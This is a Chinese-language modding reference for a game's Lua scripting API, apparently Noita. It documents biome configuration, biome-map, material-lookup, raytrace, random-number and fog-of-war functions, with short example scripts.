<p>只能用在OnWorldInitialized阶段，修改群系xml文件的一个字段的值，输入文件路径，字段名，值。使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">function</span> <span class="token function">set_biome_to_nightmare</span><span class="token punctuation">(</span> biome_name<span class="token punctuation">,</span> hp_scale<span class="token punctuation">,</span> attack_speed <span class="token punctuation">)</span>
<span class="token keyword">local</span> biome_filename <span class="token operator">=</span> <span class="token string">"data/biome/"</span> <span class="token operator">..</span> biome_name <span class="token operator">..</span> <span class="token string">".xml"</span>
<span class="token function">BiomeSetValue</span><span class="token punctuation">(</span> biome_filename<span class="token punctuation">,</span> <span class="token string">"game_enemy_hp_scale"</span><span class="token punctuation">,</span> hp_scale <span class="token punctuation">)</span>
<span class="token function">BiomeSetValue</span><span class="token punctuation">(</span> biome_filename<span class="token punctuation">,</span> <span class="token string">"game_enemy_attack_speed"</span><span class="token punctuation">,</span> attack_speed <span class="token punctuation">)</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="BiomeGetValue"><a href="#BiomeGetValue" class="headerlink" title="BiomeGetValue"></a><code>BiomeGetValue</code></h3><blockquote>
<p>BiomeGetValue( filename:string, field_name:string ) -&gt; multiple types|nil [Can be used to read biome configs. Returns one or many values matching the type or subtypes of the requested field. Reports error and returns nil if the field type is not supported or field was not found.]</p>
</blockquote>
<p>读一个群系xml文件字段的值，输入路径，字段名，字段匹配不到报错或返回nil</p>
<h3 id="BiomeObjectSetValue"><a href="#BiomeObjectSetValue" class="headerlink" title="BiomeObjectSetValue"></a><code>BiomeObjectSetValue</code></h3><blockquote>
<p>BiomeObjectSetValue( filename:string, meta_object_name:string, field_name:string, value:multiple_types ) [Can be used to edit biome configs during initialization. See biome_modifiers.lua for an usage example.]</p>
</blockquote>
<p>仅世界初始化时可用，修改xml文件里嵌套的“对象”的字段值，输入文件路径，对象名，字段名，值，举例：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token comment">-- projectiles and most entities get higher gravity (doesn't affect physics or particles)</span>
<span class="token punctuation">&#123;</span>
id <span class="token operator">=</span> <span class="token string">"HIGH_GRAVITY"</span><span class="token punctuation">,</span>
ui_description<span class="token operator">=</span><span class="token string">"$biomemodifierdesc_high_gravity"</span><span class="token punctuation">,</span>
ui_decoration_file<span class="token operator">=</span><span class="token string">"data/ui_gfx/decorations_biome_modifier/high_gravity.png"</span><span class="token punctuation">,</span>
probability<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>
action <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span> biome_name<span class="token punctuation">,</span> biome_filename <span class="token punctuation">)</span>
<span class="token function">BiomeObjectSetValue</span><span class="token punctuation">(</span> biome_filename<span class="token punctuation">,</span> <span class="token string">"modifiers"</span><span class="token punctuation">,</span> <span class="token string">"entity_gravity_y_multiplier"</span><span class="token punctuation">,</span> <span class="token number">1.5</span> <span class="token punctuation">)</span>
<span class="token keyword">end</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>其中modifier是一个隐式对象，以上是随机事件之一</p>
<h3 id="BiomeVegetationSetValue"><a href="#BiomeVegetationSetValue" class="headerlink" title="BiomeVegetationSetValue"></a><code>BiomeVegetationSetValue</code></h3><blockquote>
<p>BiomeVegetationSetValue( filename:string, material_name:string, field_name:string, value:multiple_types ) [Can be used to edit biome config MaterialComponents during initialization. Sets the given value in all found VegetationComponent with matching tree_material. See biome_modifiers.lua for an usage example.]</p>
</blockquote>
<p>仅世界初始化时可用，设置群系植物的属性，即所有VegetationComponent中匹配的字段，输入文件路径，材料名，字段名，值，参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">BiomeVegetationSetValue</span><span class="token punctuation">(</span> biome_filename<span class="token punctuation">,</span> <span class="token string">"grass"</span><span class="token punctuation">,</span> <span class="token string">"tree_material"</span><span class="token punctuation">,</span> frozen_veg_type <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<h3 id="BiomeMaterialSetValue"><a href="#BiomeMaterialSetValue" class="headerlink" title="BiomeMaterialSetValue"></a><code>BiomeMaterialSetValue</code></h3><blockquote>
<p>BiomeMaterialSetValue( filename:string, material_name:string, field_name:string, value:multiple_types ) [Can be used to edit biome config MaterialComponents during initialization. Sets the given value in the first found MaterialComponent with matching material_name. See biome_modifiers.lua for an usage example.]</p>
</blockquote>
<p>仅世界初始化时可用，设置群系材料属性，第一个找到的有匹配字段的MaterialComponent，参数同上，使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token comment">--在地面中生成更多黄金的事件</span>
action <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span> biome_name<span class="token punctuation">,</span> biome_filename <span class="token punctuation">)</span>
<span class="token keyword">if</span> biome_name <span class="token operator">==</span> <span class="token string">"rainforest"</span> <span class="token keyword">or</span> biome_name <span class="token operator">==</span> <span class="token string">"rainforest_open"</span> <span class="token keyword">or</span> biome_name <span class="token operator">==</span> <span class="token string">"vault"</span> <span class="token keyword">or</span> biome_name <span class="token operator">==</span> <span class="token string">"fungicave"</span> <span class="token keyword">then</span>
<span class="token function">BiomeMaterialSetValue</span><span class="token punctuation">(</span> biome_filename<span class="token punctuation">,</span> <span class="token string">"gold"</span><span class="token punctuation">,</span> <span class="token string">"material_max"</span><span class="token punctuation">,</span> <span class="token number">1.0</span> <span class="token punctuation">)</span> 
<span class="token function">BiomeMaterialSetValue</span><span class="token punctuation">(</span> biome_filename<span class="token punctuation">,</span> <span class="token string">"gold"</span><span class="token punctuation">,</span> <span class="token string">"material_min"</span><span class="token punctuation">,</span> <span class="token number">0.9</span> <span class="token punctuation">)</span>
<span class="token keyword">elseif</span> biome_name <span class="token operator">==</span> <span class="token string">"crypt"</span> <span class="token keyword">then</span>
<span class="token function">BiomeMaterialSetValue</span><span class="token punctuation">(</span> biome_filename<span class="token punctuation">,</span> <span class="token string">"gold"</span><span class="token punctuation">,</span> <span class="token string">"material_max"</span><span class="token punctuation">,</span> <span class="token number">20</span> <span class="token punctuation">)</span> 
<span class="token function">BiomeMaterialSetValue</span><span class="token punctuation">(</span> biome_filename<span class="token punctuation">,</span> <span class="token string">"gold"</span><span class="token punctuation">,</span> <span class="token string">"material_min"</span><span class="token punctuation">,</span> <span class="token number">0.05</span> <span class="token punctuation">)</span>
<span class="token keyword">else</span>
<span class="token function">BiomeMaterialSetValue</span><span class="token punctuation">(</span> biome_filename<span class="token punctuation">,</span> <span class="token string">"gold"</span><span class="token punctuation">,</span> <span class="token string">"material_max"</span><span class="token punctuation">,</span> <span class="token number">10</span> <span class="token punctuation">)</span> 
<span class="token function">BiomeMaterialSetValue</span><span class="token punctuation">(</span> biome_filename<span class="token punctuation">,</span> <span class="token string">"gold"</span><span class="token punctuation">,</span> <span class="token string">"material_min"</span><span class="token punctuation">,</span> <span class="token number">0.1</span> <span class="token punctuation">)</span>
<span class="token keyword">end</span>
<span class="token keyword">end</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="BiomeMaterialGetValue"><a href="#BiomeMaterialGetValue" class="headerlink" title="BiomeMaterialGetValue"></a><code>BiomeMaterialGetValue</code></h3><blockquote>
<p>BiomeMaterialGetValue( filename:string, material_name:string, field_name:string ) -&gt; multiple types|nil [Can be used to read biome config MaterialComponents during initialization. Returns the given value in the first found MaterialComponent with matching material_name. See biome_modifiers.lua for an usage example.]</p>
</blockquote>
<p>仅世界初始化时可用，获取群系材料的字段的值，输入文件路径，材料名，字段，寻找第一个匹配的MaterialComponent组件</p>
<div class="note danger flat"><p>以下群系api均需要BIOME_MAP在magic_numbers.xml里指向一个lua文件，默认是<code>BIOME_MAP=&quot;data/scripts/biome_map.lua&quot;</code></p>
</div>
<h3 id="BiomeMapSetSize"><a href="#BiomeMapSetSize" class="headerlink" title="BiomeMapSetSize"></a><code>BiomeMapSetSize</code></h3><blockquote>
<p>BiomeMapSetSize( width:int, height:int ) [This is available if BIOME_MAP in magic_numbers.xml points to a lua file, in the context of that file.]</p>
</blockquote>
<p>设置群系地图的尺寸，单位是区块。<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token comment">--data/scripts/biome_map.lua</span>
<span class="token comment">-- 2024/2/2 - made biome map loading work through this file to make it easier for mods to modify it</span>
<span class="token function">dofile_once</span><span class="token punctuation">(</span><span class="token string">"data/scripts/lib/utilities.lua"</span><span class="token punctuation">)</span>
<span class="token function">BiomeMapSetSize</span><span class="token punctuation">(</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">48</span> <span class="token punctuation">)</span>
<span class="token function">BiomeMapLoadImage</span><span class="token punctuation">(</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"data/biome_impl/biome_map.png"</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="BiomeMapGetSize"><a href="#BiomeMapGetSize" class="headerlink" title="BiomeMapGetSize"></a><code>BiomeMapGetSize</code></h3><blockquote>
<p>BiomeMapGetSize() -&gt; width:int,height:int [if BIOME_MAP in magic_numbers.xml points to a lua file returns that context, if not will return the biome_map size]</p>
</blockquote>
<p>返回尺寸（区块）</p>
<h3 id="BiomeMapSetPixel"><a href="#BiomeMapSetPixel" class="headerlink" title="BiomeMapSetPixel"></a><code>BiomeMapSetPixel</code></h3><blockquote>
<p>BiomeMapSetPixel( x:int, y:int, color_int:int ) [This is available if BIOME_MAP in magic_numbers.xml points to a lua file, in the context of that file.]</p>
</blockquote>
<p>设置生物群系像素，输入坐标（区块），“颜色”。其中颜色对应着一个xml文件，在_biomes_all.xml里写明，为一种地形的代号</p>
<h3 id="BiomeMapGetPixel"><a href="#BiomeMapGetPixel" class="headerlink" title="BiomeMapGetPixel"></a><code>BiomeMapGetPixel</code></h3><blockquote>
<p>BiomeMapGetPixel( x:int, y:int ) -&gt; color:int [This is available if BIOME_MAP in magic_numbers.xml points to a lua file, in the context of that file.]</p>
</blockquote>
<p>获取群系颜色，输入坐标，返回颜色。</p>
<h3 id="BiomeMapConvertPixelFromUintToInt"><a href="#BiomeMapConvertPixelFromUintToInt" class="headerlink" title="BiomeMapConvertPixelFromUintToInt"></a><code>BiomeMapConvertPixelFromUintToInt</code></h3><blockquote>
<p>BiomeMapConvertPixelFromUintToInt( color:int ) -&gt; int [Swaps red and blue channels of ‘color’. This can be used make sense of the BiomeMapGetPixel() return values. E.g. if( BiomeMapGetPixel( x, y ) == BiomeMapConvertPixelFromUintToInt( 0xFF36D517 ) ) then print(‘hills’) end ]</p>
</blockquote>
<p>将无符号整数颜色值转换为有符号整数颜色值。主要是交换红色和蓝色通道。用于颜色数值的比较<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">BiomeMapGetPixel</span><span class="token punctuation">(</span> x<span class="token punctuation">,</span> y <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">BiomeMapConvertPixelFromUintToInt</span><span class="token punctuation">(</span> <span class="token number">0xFF36D517</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token keyword">then</span> 
    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'hills'</span><span class="token punctuation">)</span> 
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
<h3 id="BiomeMapLoadImage"><a href="#BiomeMapLoadImage" class="headerlink" title="BiomeMapLoadImage"></a><code>BiomeMapLoadImage</code></h3><blockquote>
<p>BiomeMapLoadImage( x:int, y:int, image_filename:string ) [This is available if BIOME_MAP in magic_numbers.xml points to a lua file, in the context of that file.]</p>
</blockquote>
<p>加载的是地图群系数据，不同颜色标注着不同的群系的图。输入原点坐标，颜色图片文件</p>
<h3 id="BiomeMapLoadImageCropped"><a href="#BiomeMapLoadImageCropped" class="headerlink" title="BiomeMapLoadImageCropped"></a><code>BiomeMapLoadImageCropped</code></h3><blockquote>
<p>BiomeMapLoadImageCropped( x:int, y:int, image_filename:string, image_x:int, image_y:int, image_w:int, image_h:int ) [This is available if BIOME_MAP in magic_numbers.xml points to a lua file, in the context of that file.]</p>
</blockquote>
<p>将指定的裁剪图像加载到生物群系地图中的特定位置，输入图片要放到的坐标，图片文件，裁剪范围</p>
<h3 id="BiomeMapGetVerticalPositionInsideBiome"><a href="#BiomeMapGetVerticalPositionInsideBiome" class="headerlink" title="BiomeMapGetVerticalPositionInsideBiome"></a><code>BiomeMapGetVerticalPositionInsideBiome</code></h3><blockquote>
<p>BiomeMapGetVerticalPositionInsideBiome( x:number, y:number ) -&gt; number</p>
</blockquote>
<p>获取在一个群系里的深度，输入世界坐标，返回一个数值。使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">function</span> <span class="token function">spawn_small_enemies</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
<span class="token keyword">local</span> r <span class="token operator">=</span> <span class="token function">ProceduralRandom</span><span class="token punctuation">(</span> x<span class="token punctuation">,</span> y <span class="token punctuation">)</span>
<span class="token keyword">local</span> spawn_percent <span class="token operator">=</span> <span class="token function">BiomeMapGetVerticalPositionInsideBiome</span><span class="token punctuation">(</span> x<span class="token punctuation">,</span> y <span class="token punctuation">)</span>
spawn_percent <span class="token operator">=</span> <span class="token punctuation">(</span> <span class="token number">2.5</span> <span class="token operator">*</span> spawn_percent <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0.35</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> r <span class="token operator">></span> spawn_percent <span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token keyword">return</span> <span class="token keyword">end</span>

<span class="token function">spawn</span><span class="token punctuation">(</span>g_small_enemies<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="BiomeMapGetName"><a href="#BiomeMapGetName" class="headerlink" title="BiomeMapGetName"></a><code>BiomeMapGetName</code></h3><blockquote>
<p>BiomeMapGetName( x:number = camera_x, y:number = camera_y ) -&gt; name</p>
</blockquote>
<p>获取群系名字，输入世界坐标系下的坐标（像素），默认为镜头位置，返回名字。参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> pos_x<span class="token punctuation">,</span> pos_y <span class="token operator">=</span> <span class="token function">EntityGetTransform</span><span class="token punctuation">(</span> entity_id <span class="token punctuation">)</span>
<span class="token keyword">local</span> biome <span class="token operator">=</span> <span class="token function">BiomeMapGetName</span><span class="token punctuation">(</span> pos_x<span class="token punctuation">,</span> pos_y <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
<h2 id="CellFactory……（像素）"><a href="#CellFactory……（像素）" class="headerlink" title="CellFactory……（像素）"></a>CellFactory……（像素）</h2><h3 id="CellFactory-GetName"><a href="#CellFactory-GetName" class="headerlink" title="CellFactory_GetName"></a><code>CellFactory_GetName</code></h3><blockquote>
<p>CellFactory_GetName( material_id:int ) -&gt; string [Converts a numeric material id to the material’s strings id.]</p>
</blockquote>
<p>输入材料id，返回材料名（字符串）</p>
<h3 id="CellFactory-GetType"><a href="#CellFactory-GetType" class="headerlink" title="CellFactory_GetType"></a><code>CellFactory_GetType</code></h3><blockquote>
<p>CellFactory_GetType( material_name:string ) -&gt; int [Returns the id of a material.]</p>
</blockquote>
<p>输入材料名，返回材料id</p>
<h3 id="CellFactory-GetUIName"><a href="#CellFactory-GetUIName" class="headerlink" title="CellFactory_GetUIName"></a><code>CellFactory_GetUIName</code></h3><blockquote>
<p>CellFactory_GetUIName( material_id:int ) -&gt; string [Returns the displayed name of a material, or an empty string if ‘material_id’ is not valid. Might return a text key.]</p>
</blockquote>
<p>输入材料id，返回展ui_name。在materials.xml可以看到name，ui_name为不同的字段</p>
<h3 id="CellFactory-GetAllLiquids"><a href="#CellFactory-GetAllLiquids" class="headerlink" title="CellFactory_GetAllLiquids"></a><code>CellFactory_GetAllLiquids</code></h3><blockquote>
<p>CellFactory_GetAllLiquids( include_statics:bool = true, include_particle_fx_materials:bool = false ) -&gt; {string}</p>
</blockquote>
<p>可以无参数，默认为包括静态液体和粒子液体，可改为false，返回一个字符串表</p>
<p>测试两个参数为true/false区别的代码参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> t1 <span class="token operator">=</span> <span class="token function">CellFactory_GetAllLiquids</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                     <span class="token comment">-- 默认：包含静态和粒子特效材质</span>
    <span class="token keyword">local</span> t2 <span class="token operator">=</span> <span class="token function">CellFactory_GetAllLiquids</span><span class="token punctuation">(</span><span class="token keyword">false</span><span class="token punctuation">)</span>                <span class="token comment">-- 排除静态</span>
    <span class="token keyword">local</span> t3 <span class="token operator">=</span> <span class="token function">CellFactory_GetAllLiquids</span><span class="token punctuation">(</span><span class="token keyword">false</span><span class="token punctuation">,</span> <span class="token keyword">false</span><span class="token punctuation">)</span>         <span class="token comment">-- 排除静态和粒子材质</span>

    <span class="token comment">-- 转集合</span>
    <span class="token keyword">local</span> <span class="token keyword">function</span> <span class="token function">list_to_set</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span>
        <span class="token keyword">local</span> set <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
        <span class="token keyword">for</span> _<span class="token punctuation">,</span> v <span class="token keyword">in</span> <span class="token function">ipairs</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span> <span class="token keyword">do</span>
            set<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">true</span>
        <span class="token keyword">end</span>
        <span class="token keyword">return</span> set
    <span class="token keyword">end</span>

    <span class="token keyword">local</span> set1 <span class="token operator">=</span> <span class="token function">list_to_set</span><span class="token punctuation">(</span>t1<span class="token punctuation">)</span>
    <span class="token keyword">local</span> set2 <span class="token operator">=</span> <span class="token function">list_to_set</span><span class="token punctuation">(</span>t2<span class="token punctuation">)</span>
    <span class="token keyword">local</span> set3 <span class="token operator">=</span> <span class="token function">list_to_set</span><span class="token punctuation">(</span>t3<span class="token punctuation">)</span>

    <span class="token comment">-- 差集打印</span>
    <span class="token keyword">local</span> <span class="token keyword">function</span> <span class="token function">print_diff</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> base_set<span class="token punctuation">,</span> compare_set<span class="token punctuation">)</span>
        <span class="token function">GamePrint</span><span class="token punctuation">(</span><span class="token string">"=== "</span> <span class="token operator">..</span> name <span class="token operator">..</span> <span class="token string">" 中独有的材料 ==="</span><span class="token punctuation">)</span>
        <span class="token keyword">local</span> count <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> mat <span class="token keyword">in</span> <span class="token function">pairs</span><span class="token punctuation">(</span>base_set<span class="token punctuation">)</span> <span class="token keyword">do</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> compare_set<span class="token punctuation">[</span>mat<span class="token punctuation">]</span> <span class="token keyword">then</span>
                <span class="token function">GamePrint</span><span class="token punctuation">(</span>mat<span class="token punctuation">)</span>
                count <span class="token operator">=</span> count <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token keyword">end</span>
        <span class="token keyword">end</span>
        <span class="token keyword">if</span> count <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">then</span>
            <span class="token function">GamePrint</span><span class="token punctuation">(</span><span class="token string">"（无）"</span><span class="token punctuation">)</span>
        <span class="token keyword">end</span>
    <span class="token keyword">end</span>

    <span class="token comment">-- 打印数量</span>
    <span class="token function">GamePrint</span><span class="token punctuation">(</span><span class="token string">"=== 总数 ==="</span><span class="token punctuation">)</span>
    <span class="token function">GamePrint</span><span class="token punctuation">(</span><span class="token string">"t1 (默认): "</span> <span class="token operator">..</span> <span class="token function">tostring</span><span class="token punctuation">(</span><span class="token operator">#</span>t1<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token function">GamePrint</span><span class="token punctuation">(</span><span class="token string">"t2 (无静态): "</span> <span class="token operator">..</span> <span class="token function">tostring</span><span class="token punctuation">(</span><span class="token operator">#</span>t2<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token function">GamePrint</span><span class="token punctuation">(</span><span class="token string">"t3 (无静态无特效): "</span> <span class="token operator">..</span> <span class="token function">tostring</span><span class="token punctuation">(</span><span class="token operator">#</span>t3<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment">-- 差集对比</span>
    <span class="token function">print_diff</span><span class="token punctuation">(</span><span class="token string">"t1"</span><span class="token punctuation">,</span> set1<span class="token punctuation">,</span> set2<span class="token punctuation">)</span>   <span class="token comment">-- t1 - t2 = 静态液体</span>
    <span class="token function">print_diff</span><span class="token punctuation">(</span><span class="token string">"t2"</span><span class="token punctuation">,</span> set2<span class="token punctuation">,</span> set3<span class="token punctuation">)</span>   <span class="token comment">-- t2 - t3 = 特效粒子液体</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="CellFactory-GetAllSands"><a href="#CellFactory-GetAllSands" class="headerlink" title="CellFactory_GetAllSands"></a><code>CellFactory_GetAllSands</code></h3><p>同上</p>
<h3 id="CellFactory-GetAllGases"><a href="#CellFactory-GetAllGases" class="headerlink" title="CellFactory_GetAllGases"></a><code>CellFactory_GetAllGases</code></h3><p>同上</p>
<h3 id="CellFactory-GetAllFires"><a href="#CellFactory-GetAllFires" class="headerlink" title="CellFactory_GetAllFires"></a><code>CellFactory_GetAllFires</code></h3><p>同上</p>
<h3 id="CellFactory-GetAllSolids"><a href="#CellFactory-GetAllSolids" class="headerlink" title="CellFactory_GetAllSolids"></a><code>CellFactory_GetAllSolids</code></h3><p>同上</p>
<h3 id="CellFactory-GetTags"><a href="#CellFactory-GetTags" class="headerlink" title="CellFactory_GetTags"></a><code>CellFactory_GetTags</code></h3><blockquote>
<p>CellFactory_GetTags( material_id:int ) -&gt; {string}</p>
</blockquote>
<p>获取某种材料的tags，输入材料id，返回字符串表</p>
<h3 id="CellFactory-HasTag"><a href="#CellFactory-HasTag" class="headerlink" title="CellFactory_HasTag"></a><code>CellFactory_HasTag</code></h3><blockquote>
<p>CellFactory_HasTag( material_id:int, tag:string ) -&gt; {bool}</p>
</blockquote>
<p>检查某种材料是否具有某个标签，输入材料id，标签（带中括号），返回一个bool值（不要被上面的{bool}骗了）</p>
<h2 id="射线"><a href="#射线" class="headerlink" title="射线"></a>射线</h2><h3 id="Raytrace"><a href="#Raytrace" class="headerlink" title="Raytrace"></a><code>Raytrace</code></h3><blockquote>
<p>Raytrace( x1:number, y1:number, x2:number, y2:number ) -&gt; did_hit:bool,hit_x:number,hit_y:number [Does a raytrace that stops on any cell it hits.]</p>
</blockquote>
<p>输入两对坐标，返回一个bool值是否碰撞，以及碰撞位置的坐标</p>
<p>开销在 200次/ms 左右，也就是每帧1000不会导致卡顿，局部性良好的话可以更高</p>
<h3 id="RaytraceSurfaces"><a href="#RaytraceSurfaces" class="headerlink" title="RaytraceSurfaces"></a><code>RaytraceSurfaces</code></h3><blockquote>
<p>RaytraceSurfaces( x1:number, y1:number, x2:number, y2:number ) -&gt; did_hit:bool,hit_x:number,hit_y:number [Does a raytrace that stops on any cell that is not fluid, gas (yes, technically gas is a fluid), or fire.]</p>
</blockquote>
<p>输入输出同上，但是碰撞不包括液体、气体和火焰，开销和Raytrace基本一致</p>
<h3 id="RaytraceSurfacesAndLiquiform"><a href="#RaytraceSurfacesAndLiquiform" class="headerlink" title="RaytraceSurfacesAndLiquiform"></a><code>RaytraceSurfacesAndLiquiform</code></h3><blockquote>
<p>RaytraceSurfacesAndLiquiform( x1:number, y1:number, x2:number, y2:number ) -&gt; did_hit:bool,hit_x:number,hit_y:number [Does a raytrace that stops on any cell that is not gas or fire.]</p>
</blockquote>
<p>检测碰撞任何除气体和火焰之外的像素，几乎没有局部性时开销和Raytrace基本一致，局部性良好的话开销比Raytrace高</p>
<h3 id="RaytracePlatforms"><a href="#RaytracePlatforms" class="headerlink" title="RaytracePlatforms"></a><code>RaytracePlatforms</code></h3><blockquote>
<p>RaytracePlatforms( x1:number, y1:number, x2:number, y2:number ) -&gt; did_hit:bool,hit_x:number,hit_y:number [Does a raytrace that stops on any cell a character can stand on.]</p>
</blockquote>
<p>碰撞标准是像素可以站上去，开销略高Raytrace一点点</p>
<h2 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h2><h3 id="Random"><a href="#Random" class="headerlink" title="Random"></a><code>Random</code></h3><blockquote>
<p>Random( a:int = optional, b:int = optional ) -&gt; number|int. [This is kinda messy. If given 0 arguments, returns number between 0.0 and 1.0. If given 1 arguments, returns int between 0 and ‘a’. If given 2 arguments returns int between ‘a’ and ‘b’.]</p>
</blockquote>
<p>生成随机整数，没有参数返回值范围是0~1，一个参数是0~a，两个参数是a~b</p>
<h3 id="Randomf"><a href="#Randomf" class="headerlink" title="Randomf"></a><code>Randomf</code></h3><blockquote>
<p>Randomf( min:number = optional, max:number = optional ) -&gt; number [This is kinda messy. If given 0 arguments, returns number between 0.0 and 1.0. If given 1 arguments, returns number between 0.0 and ‘a’. If given 2 arguments returns number between ‘a’ and ‘b’.]</p>
</blockquote>
<p>生成随机数，范围同Random</p>
<h3 id="RandomDistribution"><a href="#RandomDistribution" class="headerlink" title="RandomDistribution"></a><code>RandomDistribution</code></h3><blockquote>
<p>RandomDistribution( min:int, max:int, mean:int, sharpness:number = 1, baseline:number = 0.005 ) -&gt; int</p>
</blockquote>
<p>疑似是正态分布，输出最小值，最大值，均值，尖锐度，基线。返回一个整数</p>
<h3 id="RandomDistributionf"><a href="#RandomDistributionf" class="headerlink" title="RandomDistributionf"></a><code>RandomDistributionf</code></h3><blockquote>
<p>RandomDistributionf( min:number, max:number, mean:number, sharpness:number = 1, baseline:number = 0.005 ) -&gt; number</p>
</blockquote>
<p>同上，返回一个浮点数</p>
<h3 id="ProceduralRandom"><a href="#ProceduralRandom" class="headerlink" title="ProceduralRandom"></a><code>ProceduralRandom</code></h3><blockquote>
<p>ProceduralRandom( x:number, y:number, a:int|number = optional, b:int|number = optional ) -&gt; int|number [This is kinda messy. If given 2 arguments, returns number between 0.0 and 1.0. If given 3 arguments, returns int between 0 and ‘a’. If given 4 arguments returns number between ‘a’ and ‘b’.]</p>
</blockquote>
<p>x，y是随机的种子。输入两个参数，返回0.0到1.0之间的浮点数，三个参数，返回0到a之间的整数，四个参数，返回a到b之间的一个随机浮点数</p>
<h3 id="ProceduralRandomf"><a href="#ProceduralRandomf" class="headerlink" title="ProceduralRandomf"></a><code>ProceduralRandomf</code></h3><blockquote>
<p>ProceduralRandomf( x:number, y:number, a:number = optional, b:number = optional ) -&gt; number [This is kinda messy. If given 2 arguments, returns number between 0.0 and 1.0. If given 3 arguments, returns a number between 0 and ‘a’. If given 4 arguments returns a number between ‘a’ and ‘b’.]</p>
</blockquote>
<p>同上，但是只返回浮点数</p>
<h3 id="ProceduralRandomi"><a href="#ProceduralRandomi" class="headerlink" title="ProceduralRandomi"></a><code>ProceduralRandomi</code></h3><blockquote>
<p>ProceduralRandomi(  x:number, y:number, a:int = optional, b:int = optional ) -&gt; number [This is kinda messy. If given 2 arguments, returns 0 or 1. If given 3 arguments, returns an int between 0 and ‘a’. If given 4 arguments returns an int between ‘a’ and ‘b’.]</p>
</blockquote>
<p>x，y作为种子，两个参数返回0或1，三个参数返回0到a范围内的随机整数，四个参数返回a到b的整数</p>
<h2 id="战争之雾"><a href="#战争之雾" class="headerlink" title="战争之雾"></a>战争之雾</h2><p>就是全知之眼去掉的东西</p>
<h3 id="GameGetFogOfWar"><a href="#GameGetFogOfWar" class="headerlink" title="GameGetFogOfWar"></a><code>GameGetFogOfWar</code></h3><blockquote>
<p>GameGetFogOfWar( pos_x:number, pos_y:number ) -&gt; fog_of_war:int [Returns an integer between 0 and 255. Larger value means more coverage. Returns -1 if query is outside the bounds of the fog of war grid. For performance reasons consider using the components that manipulate fog of war.]</p>
</blockquote>
<p>获取战争之雾，输入坐标，返回一个0-255的整数，数值越大表示覆盖范围越大，-1表示表示超出战争之雾格子边界。</p>
<h3 id="GameGetFogOfWarBilinear"><a href="#GameGetFogOfWarBilinear" class="headerlink" title="GameGetFogOfWarBilinear"></a><code>GameGetFogOfWarBilinear</code></h3><blockquote>
<p>GameGetFogOfWarBilinear( pos_x:number, pos_y:number ) -&gt; fog_of_war:int [Returns an integer between 0 and 255. Larger value means more coverage. Returns -1 if query is outside the bounds of the fog of war grid. The value is bilinearly filtered using four samples around ‘pos’. For performance reasons consider using the components that manipulate fog of war.]</p>
</blockquote>
